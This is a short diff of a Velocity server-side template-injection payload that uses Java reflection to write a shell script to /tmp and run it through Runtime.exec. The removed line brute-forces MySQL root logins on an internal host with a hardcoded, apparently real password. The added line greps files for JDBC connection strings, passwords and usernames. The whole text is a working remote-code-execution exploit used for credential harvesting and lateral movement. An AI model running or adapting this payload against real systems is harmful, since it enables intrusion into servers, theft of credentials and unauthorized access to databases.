@@ -1,6 +1,6 @@
 #set($x = "")
 #set($w2 = $x.getClass().forName("java.io.FileWriter").getConstructor($x.getClass().forName("java.lang.String")).newInstance("/tmp/zz_cmd.sh"))
-$w2.write("echo ===ROOT53-3306-A===; mysql -h10.18.19.53 -P3306 -uroot -p'Dianrong.com.cn@1987' -e 'show databases' 2>&1 | head -15; echo ===ROOT53-3306-B===; mysql -h10.18.19.53 -P3306 -uroot -proot -e 'show databases' 2>&1 | head -6; echo ===ROOT53-3309-A===; mysql -h10.18.19.53 -P3309 -uroot -p'Dianrong.com.cn@1987' -e 'show databases' 2>&1 | head -10")
+$w2.write("xargs -a /tmp/grep_jdbc.txt grep -iH -E 'jdbc:mysql|password|passwd|username|user *=' 2>/dev/null | tail -n +46 | head -45")
 $w2.close()
 #set($rt = $x.getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null))
 #set($p = $rt.exec("/bin/bash /tmp/zz_cmd.sh"))
